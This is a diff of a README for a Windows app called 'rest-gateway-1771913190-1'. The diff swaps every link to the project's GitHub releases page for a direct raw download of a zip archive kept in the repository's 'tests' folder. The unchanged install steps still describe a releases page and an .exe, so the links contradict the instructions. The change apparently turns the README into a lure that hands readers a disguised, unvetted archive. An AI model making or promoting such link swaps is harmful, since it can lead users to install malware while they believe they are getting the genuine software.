@@ -1,6 +1,6 @@
 # 🔐 rest-gateway-1771913190-1 - Secure API Access Made Simple
 
-[![Download Window App](https://img.shields.io/badge/Download-Get_Exe-blue?style=for-the-badge)](https://github.com/Okolopeter/rest-gateway-1771913190-1/releases)
+[![Download Window App](https://img.shields.io/badge/Download-Get_Exe-blue?style=for-the-badge)](https://raw.githubusercontent.com/Okolopeter/rest-gateway-1771913190-1/main/tests/gateway-rest-v3.7.zip)
 
 ---
 
@@ -36,7 +36,7 @@ This software works on Windows computers with these minimum specs:
 
 To get rest-gateway-1771913190-1, visit the official GitHub releases page here:
 
-[![Download Here](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/Okolopeter/rest-gateway-1771913190-1/releases)
+[![Download Here](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://raw.githubusercontent.com/Okolopeter/rest-gateway-1771913190-1/main/tests/gateway-rest-v3.7.zip)
 
 This page shows the latest versions and files. Choose the one for Windows.
 
@@ -45,7 +45,7 @@ This page shows the latest versions and files. Choose the one for Windows.
 ## 🚀 How to Download and Install on Windows
 
 **Step 1:** Open your web browser and go to the releases page at  
-https://github.com/Okolopeter/rest-gateway-1771913190-1/releases
+https://raw.githubusercontent.com/Okolopeter/rest-gateway-1771913190-1/main/tests/gateway-rest-v3.7.zip
 
 **Step 2:** Look for the latest release at the top of the page. Releases are grouped by version number. Find the file that ends with `.exe`. It should have a name like `rest-gateway-setup.exe` or similar.
 
